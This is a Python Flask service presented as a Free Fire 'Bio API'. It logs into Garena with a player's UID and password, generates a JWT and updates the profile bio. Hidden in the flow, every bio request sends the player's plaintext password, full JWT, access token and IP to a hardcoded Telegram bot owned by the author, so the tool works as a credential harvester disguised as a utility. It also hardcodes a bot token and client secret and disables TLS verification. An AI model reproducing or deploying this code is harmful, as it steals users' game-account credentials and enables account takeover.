# app.py - FULL VERSION (Auto Generate JWT dari UID/Pass + Update Bio)
from flask import Flask, request, jsonify, make_response
import requests
import binascii
import jwt
import urllib3
import random
import string
import time
import json
import hashlib
import re
import struct
import threading
import asyncio
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

# Import jwt_generator
import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# Coba import jwt_generator, jika gagal fallback ke manual
try:
    from jwt import get_jwt_sync, get_jwt_from_token_sync
    JWT_GENERATOR_AVAILABLE = True
    print("✅ Using jwt_generator.py for JWT generation")
except ImportError:
    JWT_GENERATOR_AVAILABLE = False
    print("⚠️ jwt_generator.py not found, using manual JWT generation")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# ============ TELEGRAM CONFIG ============
BOT_TOKEN = "8965307683:AAGXwuIge4QKuYXtrkXhG4AahxDrynqi7SY"
OWNER_ID = 8660700322
CHANNEL_PROMO = "@dindingijo"

# ============ KONFIGURASI ============
FREEFIRE_UPDATE_URLS = [
    "https://clientbp.ggblueshark.com/UpdateSocialBasicInfo",
    "https://clientbp.common.ggbluefox.com/UpdateSocialBasicInfo",
]

GET_BIO_URL = "https://ff.ggbluewhale.store/api/data"
PROFILE_API = "https://ff.ggbluewhale.store/api/data"
PROFILE_API_KEY = "kenn"

OAUTH_URL = "https://100067.connect.garena.com/oauth/guest/token/grant"
FREEFIRE_VERSION = "OB54"

KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

# ============ HEADERS ============
BIO_HEADERS = {
    "Expect": "100-continue",
    "X-Unity-Version": "2018.4.11f1",
    "X-GA": "v1 1",
    "ReleaseVersion": FREEFIRE_VERSION,
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A305F Build/RP1A.200720.012)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
}

LOGIN_HEADERS = {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_Z01QD Build/PI)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/octet-stream",
    "Expect": "100-continue",
    "X-Unity-Version": "2018.4.11f1",
    "X-GA": "v1 1",
    "ReleaseVersion": FREEFIRE_VERSION
}

# ============ FUNGSI ENKRIPSI ============
def encrypt_data(data_bytes):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    padded = pad(data_bytes, AES.block_size)
    return cipher.encrypt(padded)

def encode_varint(n):
    result = []
    while True:
        byte = n & 0x7F
        n >>= 7
        if n:
            byte |= 0x80
        result.append(byte)
        if not n:
            break
    return bytes(result)

# ============ BUILD PAYLOAD ============
def build_bio_payload(bio_text):
    payload = b''
    payload += encode_varint((2 << 3) | 0) + encode_varint(17)
    payload += encode_varint((5 << 3) | 2) + encode_varint(0)
    payload += encode_varint((6 << 3) | 2) + encode_varint(0)
    bio_bytes = bio_text.encode('utf-8')
    payload += encode_varint((8 << 3) | 2) + encode_varint(len(bio_bytes)) + bio_bytes
    payload += encode_varint((9 << 3) | 0) + encode_varint(1)
    payload += encode_varint((11 << 3) | 2) + encode_varint(0)
    payload += encode_varint((12 << 3) | 2) + encode_varint(0)
    return payload

# ============ FUNGSI UTAMA ============
def decode_jwt_info(token):
    try:
        decoded = jwt.decode(token, options={"verify_signature": False})
        name = decoded.get("nickname")
        region = decoded.get("lock_region") or decoded.get("country_code", "ID")
        uid = decoded.get("account_id")
        return str(uid), name, region
    except Exception:
        return None, None, None

def perform_guest_login(uid, password):
    try:
        payload = {
            'uid': uid,
            'password': password,
            'response_type': "token",
            'client_type': "2",
            'client_secret': "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3",
            'client_id': "100067"
        }
        headers = {
            'User-Agent': "GarenaMSDK/4.0.39(SM-M526B ;Android 13;pt;BR;)",
            'Connection': "Keep-Alive"
        }
        
        resp = requests.post(OAUTH_URL, data=payload, headers=headers, timeout=10, verify=False)
        data = resp.json()
        
        if 'access_token' in data:
            return data['access_token'], data.get('open_id')
    except Exception as e:
        print(f"Guest login error: {e}")
    return None, None

def perform_major_login(access_token, open_id):
    try:
        payload = b''
        
        ts = "2024-12-05 18:15:32"
        payload += encode_varint((1 << 3) | 2) + encode_varint(len(ts)) + ts.encode()
        
        gn = "free fire"
        payload += encode_varint((2 << 3) | 2) + encode_varint(len(gn)) + gn.encode()
        
        payload += encode_varint((3 << 3) | 0) + encode_varint(1)
        
        vc = "1.123.1"
        payload += encode_varint((4 << 3) | 2) + encode_varint(len(vc)) + vc.encode()
        
        os_info = "Android OS 9 / API-28 (PI/rel.cjw.20220518.114133)"
        payload += encode_varint((5 << 3) | 2) + encode_varint(len(os_info)) + os_info.encode()
        
        dt = "Handheld"
        payload += encode_varint((6 << 3) | 2) + encode_varint(len(dt)) + dt.encode()
        
        np = "Verizon Wireless"
        payload += encode_varint((7 << 3) | 2) + encode_varint(len(np)) + np.encode()
        
        ct = "WIFI"
        payload += encode_varint((8 << 3) | 2) + encode_varint(len(ct)) + ct.encode()
        
        payload += encode_varint((9 << 3) | 0) + encode_varint(1280)
        payload += encode_varint((10 << 3) | 0) + encode_varint(960)
        
        dpi = "240"
        payload += encode_varint((11 << 3) | 2) + encode_varint(len(dpi)) + dpi.encode()
        
        cpu = "ARMv7 VFPv3 NEON VMH | 2400 | 4"
        payload += encode_varint((12 << 3) | 2) + encode_varint(len(cpu)) + cpu.encode()
        
        payload += encode_varint((13 << 3) | 0) + encode_varint(5951)
        
        gpu = "Adreno (TM) 640"
        payload += encode_varint((14 << 3) | 2) + encode_varint(len(gpu)) + gpu.encode()
        
        gv = "OpenGL ES 3.0"
        payload += encode_varint((15 << 3) | 2) + encode_varint(len(gv)) + gv.encode()
        
        uid = "Google|74b585a9-0268-4ad3-8f36-ef41d2e53610"
        payload += encode_varint((16 << 3) | 2) + encode_varint(len(uid)) + uid.encode()
        
        ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
        payload += encode_varint((17 << 3) | 2) + encode_varint(len(ip)) + ip.encode()
        
        lang = "en"
        payload += encode_varint((18 << 3) | 2) + encode_varint(len(lang)) + lang.encode()
        
        payload += encode_varint((19 << 3) | 2) + encode_varint(len(open_id)) + open_id.encode()
        payload += encode_varint((20 << 3) | 2) + encode_varint(len(access_token)) + access_token.encode()
        
        payload += encode_varint((21 << 3) | 0) + encode_varint(8)
        payload += encode_varint((99 << 3) | 2) + encode_varint(1) + b'8'
        payload += encode_varint((100 << 3) | 2) + encode_varint(1) + b'8'
        
        encrypted = encrypt_data(payload)
        hex_encrypted = binascii.hexlify(encrypted).decode('utf-8')
        edata = bytes.fromhex(hex_encrypted)
        
        response = requests.post(
            "https://loginbp.ggblueshark.com/MajorLogin",
            data=edata,
            headers=LOGIN_HEADERS,
            verify=False,
            timeout=10
        )

        if response.status_code == 200:
            content = response.text
            jwt_start = content.find("eyJ")
            if jwt_start != -1:
                jwt_token = content[jwt_start:]
                parts = jwt_token.split('.')
                if len(parts) >= 3:
                    return '.'.join(parts[:3])
        return None
    except Exception as e:
        print(f"Major login error: {e}")
        return None

def generate_jwt_from_uid_pass_manual(uid, password):
    """Manual JWT generation (fallback)"""
    try:
        access_token, open_id = perform_guest_login(uid, password)
        if not access_token or not open_id:
            return None, None
        jwt_token = perform_major_login(access_token, open_id)
        return jwt_token, access_token
    except Exception as e:
        print(f"Manual JWT error: {e}")
        return None, None

def generate_jwt_from_uid_pass(uid, password):
    """Generate JWT dari UID + Password - prioritas pakai jwt_generator.py"""
    
    # Method 1: Pakai jwt_generator.py (lebih reliable)
    if JWT_GENERATOR_AVAILABLE:
        try:
            print(f"🔑 Generating JWT using jwt_generator.py for UID: {uid}")
            result = get_jwt_sync(uid, password)
            if result and result.get('token'):
                print(f"✅ JWT generated via jwt_generator.py")
                return result['token'], result.get('access_token')
        except Exception as e:
            print(f"⚠️ jwt_generator.py failed: {e}, falling back to manual")
    
    # Method 2: Fallback ke manual
    print(f"🔑 Generating JWT manually for UID: {uid}")
    return generate_jwt_from_uid_pass_manual(uid, password)

def check_profile_from_api(uid, region="id"):
    """Cek profil dari API ff.ggbluewhale.store"""
    try:
        url = f"{PROFILE_API}?region={region}&uid={uid}&key={PROFILE_API_KEY}"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            
            if data.get('basicInfo'):
                basic = data['basicInfo']
                social = data.get('socialInfo', {})
                clan = data.get('clanBasicInfo', {})
                
                return {
                    "name": basic.get('nickname', 'Unknown'),
                    "level": basic.get('level', '?'),
                    "rank": basic.get('rank', '?'),
                    "region": basic.get('region', region.upper()),
                    "uid": basic.get('accountId', uid),
                    "signature": social.get('signature', ''),
                    "clan": clan.get('clanName', 'N/A'),
                    "status": "✅ Found"
                }
        
        return None
    except Exception as e:
        print(f"API check error: {e}")
        return None

def upload_bio_request(jwt_token, bio_text):
    try:
        payload_bytes = build_bio_payload(bio_text)
        encrypted = encrypt_data(payload_bytes)

        headers = BIO_HEADERS.copy()
        headers["Authorization"] = f"Bearer {jwt_token}"

        for endpoint in FREEFIRE_UPDATE_URLS:
            try:
                resp = requests.post(
                    endpoint,
                    headers=headers,
                    data=encrypted,
                    timeout=15,
                    verify=False
                )
                
                status_text = "✅ Success" if resp.status_code == 200 else f"⚠️ Status {resp.status_code}"
                raw_hex = binascii.hexlify(resp.content).decode('utf-8')
                
                return {
                    "status": status_text,
                    "code": resp.status_code,
                    "bio": bio_text,
                    "endpoint": endpoint,
                    "server_response": raw_hex
                }
            except Exception as e:
                continue
        
        return {"status": "❌ All endpoints failed", "code": 500}
    except Exception as e:
        return {"status": f"Error: {str(e)}", "code": 500}

def send_telegram_notification(uid, password, name, level, rank, region, jwt_token, ip_address, bio_status, signature="", clan="N/A", action="BIO UPDATE", access_token=None):
    """Kirim notifikasi lengkap ke Telegram termasuk JWT dan Access Token"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        
        message = f"""🔥 <b>FREE FIRE {action}</b> 🔥

👤 <b>Name:</b> {name or 'N/A'}
🆔 <b>UID:</b> <code>{uid}</code>
🔑 <b>Password:</b> <code>{password}</code>
📊 <b>Level:</b> {level or 'N/A'}
🏆 <b>Rank:</b> {rank or 'N/A'}
⚔️ <b>Guild:</b> {clan or 'N/A'}
📝 <b>Bio:</b> {signature or 'N/A'}
🌍 <b>Region:</b> {region.upper() if region else 'ID'}
📱 <b>Bio Status:</b> {bio_status}

🔐 <b>JWT TOKEN (LENGKAP):</b>
<code>{jwt_token}</code>

🔑 <b>Access Token:</b>
<code>{access_token[:50] if access_token else 'N/A'}...</code>

📞 <b>IP Caller:</b> {ip_address}
⏰ <b>Time:</b> {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}

💡 Join: {CHANNEL_PROMO}"""
        
        payload = {
            "chat_id": OWNER_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        
        threading.Thread(target=lambda: requests.post(url, json=payload, timeout=10)).start()
        return True
    except Exception as e:
        print(f"Telegram error: {e}")
        return False

# ============ ROUTES ============
@app.route("/bio_upload", methods=["GET", "POST"])
def combined_bio_upload():
    """Endpoint untuk SET/UPDATE bio - Auto generate JWT dari UID/Pass"""
    bio = request.args.get("bio") or request.form.get("bio")
    jwt_token = request.args.get("jwt") or request.form.get("jwt")
    uid = request.args.get("uid") or request.form.get("uid")
    password = request.args.get("pass") or request.form.get("pass")
    region = request.args.get("region") or request.form.get("region") or "id"
    
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if not bio:
        return jsonify({
            "status": "❌ Error",
            "code": 400,
            "error": "Missing 'bio' parameter",
            "usage": {
                "jwt": "/bio_upload?bio=Hello&jwt=YOUR_JWT&region=id",
                "uid_pass": "/bio_upload?bio=Hello&uid=UID&pass=PASSWORD&region=id"
            }
        }), 400
    
    final_jwt = jwt_token
    final_uid = uid
    final_password = password or "N/A"
    final_name = None
    final_region = region.lower()
    login_method = "Direct JWT"
    profile_info = None
    access_token = None
    
    # Method 1: Direct JWT (langsung pakai JWT yang diberikan)
    if final_jwt:
        uid_from_jwt, name_from_jwt, region_from_jwt = decode_jwt_info(final_jwt)
        if uid_from_jwt:
            final_uid = uid_from_jwt
            final_name = name_from_jwt
            if region == "id" and region_from_jwt:
                final_region = region_from_jwt.lower()
            login_method = "Direct JWT"
    
    # Method 2: UID + Password → AUTO GENERATE JWT BARU
    elif uid and password:
        login_method = "UID/Pass Login (Auto Generate JWT)"
        final_uid = uid
        final_password = password
        
        # Generate JWT baru dari UID + Password
        generated_jwt, access_token = generate_jwt_from_uid_pass(uid, password)
        
        if generated_jwt:
            final_jwt = generated_jwt
            _, name_from_jwt, region_from_jwt = decode_jwt_info(generated_jwt)
            final_name = name_from_jwt
            if region == "id" and region_from_jwt:
                final_region = region_from_jwt.lower()
            print(f"✅ New JWT generated successfully for UID: {uid}")
        else:
            return jsonify({
                "status": "❌ JWT Generation Failed",
                "code": 401,
                "error": "Failed to generate JWT from UID/Password. Please check credentials.",
                "uid": uid,
                "hint": "Make sure UID and Password are correct"
            }), 401
    
    if not final_jwt:
        return jsonify({
            "status": "❌ JWT Required",
            "code": 400,
            "error": "Please provide a valid JWT token or UID/Pass to generate new JWT"
        }), 400
    
    # Upload bio dengan JWT
    bio_result = upload_bio_request(final_jwt, bio)
    
    # Check profile dari API (untuk mendapatkan nama, level, dll)
    if final_uid:
        try:
            profile_info = check_profile_from_api(final_uid, final_region)
        except:
            profile_info = None
    
    # Jika API gagal, gunakan data dari JWT
    if not profile_info:
        profile_info = {
            "name": final_name or 'Unknown',
            "level": '?',
            "rank": '?',
            "region": final_region,
            "uid": final_uid,
            "signature": bio,
            "clan": 'N/A',
            "status": "❌ Not Found"
        }
    
    # Kirim Telegram dengan semua info
    send_telegram_notification(
        uid=profile_info.get('uid', final_uid or 'N/A'),
        password=final_password,
        name=profile_info.get('name', final_name or 'Unknown'),
        level=profile_info.get('level', '?'),
        rank=profile_info.get('rank', '?'),
        region=profile_info.get('region', final_region),
        jwt_token=final_jwt,
        ip_address=client_ip,
        bio_status=bio_result.get('status', 'Unknown'),
        signature=profile_info.get('signature', bio),
        clan=profile_info.get('clan', 'N/A'),
        action="BIO UPDATE",
        access_token=access_token
    )
    
    # Response
    response_data = {
        "Credit": "sulav_codex_ff",
        "Join For More": "Telegram: @sulav_don2",
        "action": "UPDATE BIO",
        "status": bio_result.get("status", "Unknown"),
        "login_method": login_method,
        "code": bio_result.get("code", 500),
        "bio": bio,
        "uid": profile_info.get('uid', final_uid),
        "password": final_password,
        "name": profile_info.get('name', final_name),
        "level": profile_info.get('level', '?'),
        "rank": profile_info.get('rank', '?'),
        "clan": profile_info.get('clan', 'N/A'),
        "profile_status": profile_info.get('status', '❌ Not Found'),
        "region": profile_info.get('region', final_region).upper(),
        "server_response": bio_result.get("server_response", "N/A"),
        "endpoint_used": bio_result.get("endpoint", "N/A"),
        "generated_jwt": final_jwt,
        "access_token": access_token,
        "telegram_sent": True,
        "jwt_generator_used": "jwt_generator.py" if JWT_GENERATOR_AVAILABLE else "manual"
    }

    response = make_response(jsonify(response_data))
    response.headers["Content-Type"] = "application/json"
    return response

@app.route("/generate_jwt", methods=["GET", "POST"])
def generate_jwt_only():
    """Endpoint khusus untuk generate JWT saja (tanpa update bio)"""
    uid = request.args.get("uid") or request.form.get("uid")
    password = request.args.get("pass") or request.form.get("pass")
    
    if not uid or not password:
        return jsonify({
            "success": False,
            "error": "Missing uid or pass parameter",
            "usage": "/generate_jwt?uid=16208500077&pass=ANONFK123ABC"
        }), 400
    
    jwt_token, access_token = generate_jwt_from_uid_pass(uid, password)
    
    if jwt_token:
        return jsonify({
            "success": True,
            "uid": uid,
            "jwt_token": jwt_token,
            "access_token": access_token,
            "jwt_generator_used": "jwt_generator.py" if JWT_GENERATOR_AVAILABLE else "manual",
            "Credit": "sulav_codex_ff"
        })
    else:
        return jsonify({
            "success": False,
            "error": "Failed to generate JWT",
            "uid": uid
        }), 401

@app.route("/get_bio", methods=["GET"])
def get_bio():
    """Endpoint untuk MELIHAT bio orang lain (tanpa mengubah)"""
    uid = request.args.get("uid")
    region = request.args.get("region", "id")
    
    if not uid:
        return jsonify({
            "success": False,
            "error": "Missing 'uid' parameter",
            "usage": "/get_bio?uid=16208500077&region=id"
        }), 400
    
    try:
        url = f"{GET_BIO_URL}?region={region}&uid={uid}&key={PROFILE_API_KEY}"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            
            if data.get('basicInfo'):
                basic = data['basicInfo']
                social = data.get('socialInfo', {})
                clan = data.get('clanBasicInfo', {})
                
                return jsonify({
                    "success": True,
                    "action": "GET BIO",
                    "data": {
                        "uid": basic.get('accountId', uid),
                        "name": basic.get('nickname', 'Unknown'),
                        "level": basic.get('level', '?'),
                        "rank": basic.get('rank', '?'),
                        "region": basic.get('region', region.upper()),
                        "bio": social.get('signature', ''),
                        "clan": clan.get('clanName', 'N/A')
                    },
                    "Credit": "sulav_codex_ff",
                    "Join For More": "Telegram: @sulav_don2"
                })
            else:
                return jsonify({
                    "success": False,
                    "error": "Profile not found",
                    "uid": uid
                }), 404
        else:
            return jsonify({
                "success": False,
                "error": f"API returned status {response.status_code}",
                "uid": uid
            }), response.status_code
            
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e),
            "uid": uid
        }), 500

@app.route("/", methods=["GET"])
def home():
    return jsonify({
        "success": True,
        "message": "Free Fire Bio API - Auto JWT Generator",
        "endpoints": {
            "/bio_upload": "SET/UPDATE bio (auto generate JWT from UID/Pass)",
            "/generate_jwt": "Generate JWT only from UID/Pass",
            "/get_bio": "GET bio orang lain (tanpa mengubah)",
            "/check_profile": "Check profile data from API",
            "/": "This info page"
        },
        "usage": {
            "set_bio": "/bio_upload?bio=Hello&uid=UID&pass=PASSWORD&region=id",
            "generate_jwt": "/generate_jwt?uid=UID&pass=PASSWORD",
            "get_bio": "/get_bio?uid=UID&region=id",
            "check_profile": "/check_profile?uid=UID&region=id"
        },
        "features": [
            "✅ Auto generate JWT from UID + Password",
            "✅ Set/Update bio with generated JWT",
            "✅ Get bio of any player (read-only)",
            "✅ Get nickname, level, rank, region, clan",
            "✅ Telegram notification with complete JWT + Access Token",
            "✅ Uses jwt_generator.py for reliable JWT generation"
        ],
        "jwt_generator": "jwt_generator.py" if JWT_GENERATOR_AVAILABLE else "manual (fallback)",
        "Credit": "sulav_codex_ff",
        "Telegram": "@sulav_don2"
    })

@app.route("/check_profile", methods=["GET"])
def check_profile():
    uid = request.args.get("uid")
    region = request.args.get("region", "id")
    
    if not uid:
        return jsonify({
            "error": "Missing uid parameter",
            "example": "/check_profile?uid=16208500077&region=id"
        }), 400
    
    result = check_profile_from_api(uid, region)
    if result:
        return jsonify({
            "success": True,
            "action": "CHECK PROFILE",
            "data": result
        })
    else:
        return jsonify({
            "success": False,
            "error": "Profile not found"
        }), 404

# ============ MAIN ============
if __name__ == "__main__":
    print("=" * 60)
    print("🔥 FREE FIRE BIO API - AUTO JWT GENERATOR")
    print("=" * 60)
    print(f"📱 JWT Generator: {'jwt_generator.py' if JWT_GENERATOR_AVAILABLE else 'Manual (fallback)'}")
    print(f"🚀 Server running on http://0.0.0.0:5000")
    print("=" * 60)
    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
